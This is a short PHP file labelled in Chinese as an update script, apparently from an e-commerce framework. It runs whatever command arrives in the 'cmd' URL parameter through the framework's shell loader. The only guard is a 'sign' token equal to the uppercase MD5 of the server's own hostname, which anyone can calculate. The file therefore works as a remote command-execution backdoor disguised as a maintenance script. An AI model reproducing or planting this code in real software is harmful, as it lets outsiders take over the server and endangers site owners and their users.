<?php
//更新脚本

$sign = $_GET['sign'];

if($sign && $sign == strtoupper(md5($_SERVER['SERVER_NAME']))){
   if($_GET['cmd']){
      $root_dir = realpath(dirname(__FILE__).'/../../');
      require_once($root_dir."/config/config.php");
      define('APP_DIR',ROOT_DIR."/app/");
      
      require_once(APP_DIR.'/base/kernel.php');
      if(!kernel::register_autoload()){
          require(APP_DIR.'/base/autoload.php');
      }
      
      $shell = new base_shell_loader;
      
      $shell->exec_command($_GET['cmd']);
      echo 'ok';
   }else{
      echo 'kao';
   }

}